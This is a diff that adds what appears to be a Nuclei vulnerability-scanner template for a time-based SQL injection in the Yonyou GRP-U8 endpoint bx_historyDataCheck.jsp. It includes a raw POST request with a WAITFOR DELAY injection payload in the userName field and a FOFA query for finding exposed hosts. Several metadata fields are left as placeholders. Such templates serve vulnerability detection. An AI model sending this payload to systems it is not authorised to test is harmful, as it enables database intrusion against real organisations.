@@ -1,0 +1,31 @@
+id: YongYouGRP_U8-bx_historyDataCheck-SQL
+
+info:
+  name: 用友GRP_U8-bx_historyDataCheck-SQL注入漏洞
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: app="yonyou-GRP-U8"
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Host: {{Hostname}}
+
+        userName=';WAITFOR DELAY '0:0:3'--&ysnd=&historyFlag=
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && duration>=3 && duration<=4"
